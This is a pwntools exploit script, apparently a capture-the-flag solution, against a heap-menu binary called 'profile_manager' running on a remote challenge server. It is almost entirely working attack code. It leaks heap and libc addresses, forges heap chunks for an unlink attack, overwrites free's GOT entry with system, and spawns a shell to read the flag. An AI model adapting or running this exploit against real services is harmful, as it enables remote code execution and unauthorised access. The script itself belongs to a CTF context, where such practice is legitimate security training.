from pwn import *
LOCAL = False
binary = './profile_manager'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10140)

context.arch = 'amd64'
elf = ELF(binary, checksec=False)
libc= ELF('libc.so.6', checksec=False)

def add(name, age, len_desc, desc=None):
    age = int(age)
    len_desc = int(len_desc)
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Name :')
    r.send(name)
    sleep(0.2)
    r.recvuntil('Age :')
    r.sendline(str(age))
    r.recvuntil('Length of description :')
    r.sendline(str(len_desc))
    r.recvuntil('Description :')
    if desc == None:
        desc = 'A' * len_desc
    r.send(desc)
    sleep(0.2)

def show(index):
    r.recvuntil('Your choice :')
    r.sendline('2')
    r.recvuntil('ID :')
    r.sendline(str(index))

def edit(index, name, age, desc):
    age = int(age)
    r.recvuntil('Your choice :')
    r.sendline('3')
    r.recvuntil('ID :')
    r.sendline(str(index))
    r.recvuntil('Name :')
    if name == '\x00':
        r.send('\x00' * 16)
        r.recvuntil('Realloc Error !')
        return
    else:
        r.send(name)
    sleep(0.2)
    r.recvuntil('Age :')
    r.sendline(str(age))
    r.recvuntil('Description :')
    r.send(desc)
    sleep(0.2)

def free_name(index):
    r.recvuntil('Your choice :')
    r.sendline('3')
    r.recvuntil('ID :')
    r.sendline(str(index))
    r.recvuntil('Name :')
    r.send('\x00' * 16)
    r.recvuntil('Realloc Error !')

def delete(index):
    r.recvuntil('Your choice :')
    r.sendline('4')
    r.recvuntil('ID :')
    r.sendline(str(index))

def quit():
    r.recvuntil('Your choice :')
    r.sendline('5')

def recv_show():
    bar = '==================================='
    data = r.recvuntil(bar)
    return data

add('A', 1, 200, 'A')
add('B', 1, 200, 'B')
add('C', 1, 200, 'C')
delete(0)
delete(1)
delete(2)

add('A', 1, 200+32, 'A')
add('\x00', 1, 200, 'B')
add('C', 1, 200, 'C')

edit(1, '\n', 1, 'B')
show(1)
r.recvuntil('= Name :')
heapleak = '\x00' + r.recvuntil('= Age :').split('\n')[1]
heapbase = int(heapleak[::-1].encode('hex'), 16)
print "heapbase:", hex(heapbase)

edit(1, 'B'*8, 1, 'B')
show(1)
r.recvuntil('= Name : ' + 'B' * 8)
libcleak = r.recvuntil('= Age :').split('\n')[0]
libcleak = int(libcleak[::-1].encode('hex'), 16)
libcbase = libcleak - 0x3c4b78 # offset
print "libcbase:", hex(libcbase)

edit(1, '\x00', 1, 'B')
delete(0)
delete(1)
add(p64(heapbase+0x10), 1, 200, 'A')
add('B'*8+'\x21\x00', 1, 200, 'B')
add('C', 1, 200, 'C')
add('D'*8+'\xc1\x03', 1, 200, (flat(0, 0, 0, 0xb1)).ljust(100, 'D'))
delete(1)

smallbin = libcbase + 0x3c4b88
# forge the heap
add('E', 1, 0x3c8-0x10, flat(
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0x21,
smallbin,smallbin,
0x20, 0x121,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0x21,
0,0,
0, 0xd1,
0, 0xc1,
0x602140-0x18,
0x602140-0x10,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0,0,
0xc0,0xd0,

))

edit(3, '\x00', 1, 'A')
edit(2, 'A', 1, flat(elf.got['free']))
edit(1, '/bin/sh\x00', 1, flat(libcbase+libc.symbols['system']))
#pause()
delete(1)

r.sendline('cat /home/`whoami`/flag')
r.interactive()
